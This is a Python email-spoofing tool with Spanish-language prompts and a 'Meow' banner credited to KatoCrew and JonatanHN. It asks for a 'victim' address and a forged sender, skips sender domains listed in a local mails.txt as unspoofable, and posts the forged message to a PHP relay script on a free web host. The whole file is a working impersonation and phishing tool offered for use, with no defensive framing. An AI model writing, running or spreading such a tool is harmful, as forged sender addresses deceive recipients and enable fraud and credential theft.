#!/usr/bin/python
# coding=utf-8
import requests
from os import remove
from os import path
import os

if __name__ == '__main__':
    os.system("clear")



    print ("""-----------------------------------------------
    Meow ^-^
    Creado By KatoCrew
    Modificado by JonatanHN </>
-----------------------------------------------
    """)

    vic = input("Escribe el correo de la Víctima: ")
    de = input("Escribe el correo del Remitente: ")
    rev = de.find('@')
    dom = (de[rev:])
    archivo = "mails.txt"
    f = open (archivo)
    buscar = f.read()
    n = buscar.count(dom)
    f.close
    if n == 1:
        os.system("clear")
        print ("""-------------------------------------------
----
    Meow ^-^
    creado By KatoCrew
    Modificado by JonatanHN </>
-----------------------------------------------
    """)
        print ('''

        Este correo no se puede suplantar
        Meow :(

            ''')
    else:
        asu = input("escribe el asunto: ")
        tipo = input("Tu correo estara en html (presiona 'h') o Sera solo texto? (presiona solo 't'): ")
        if tipo == 'h':
            print ("""
            Se Enviara El Contenido De html.txt
            """)
            f = open ('../html.txt','r')
            msg = f.read()
            url = 'http://egmileniamail.000webhostapp.com/enviado.php'
            args = {
                'to':''+vic+'',
                'subject':''+asu+'',
                'message':''+msg+'',
                'from':''+de+''
            }
            response = requests.post(url, data=args)
            if response.status_code == 200:
                os.system("clear")
                print ("""---------------------------------------
--------
    Meow ^-^
    creado By KatoCrew
    Modificado by JonatanHN </>
-----------------------------------------------
""")
                print(response.text)
                print("""
            Estos son tus Datos:
                """)
                print ("De : " + de)
                print ("Para : " + vic)
                print ("Asunto : " + asu)
                print ("Mensaje : " + msg)
                f.close()
            else:
                os.system("clear")
                print ("""---------------------------------------
--------
    Meow ^-^
    creado By KatoCrew
    Modificado by JonatanHN </>
-----------------------------------------------
    """)
                print('Error de pagina, Avisale a Kato')
                
        else:
            msg=input("Escribe el mensaje: ")
            url = 'http://egmileniamail.000webhostapp.com/enviado.php'
            args = {
                'to':''+vic+'',
                'subject':''+asu+'',
                'message':''+msg+'',
                'from':''+de+''
            }
            response = requests.post(url, data=args)
            if response.status_code == 200:
                os.system("clear")
                print ("""---------------------------------------
--------
    Meow ^-^
    creado By KatoCrew
    Modificado by JonatanHN </>
-----------------------------------------------
""")
                print(response.text)
                print("""
            Estos son tus Datos:
                """)
                print ("De : " + de)
                print ("Para : " + vic)
                print ("Asunto : " + asu)
                print ("Mensaje : " + msg)
                f.close()
            else:
                os.system("clear")
                print ("""---------------------------------------
--------
    Meow ^-^
    creado By KatoCrew
    Modificado by JonatanHN </>
-----------------------------------------------
    """)
                print('Error de pagina, Avisale a Kato')
            
            
            
            
            
            
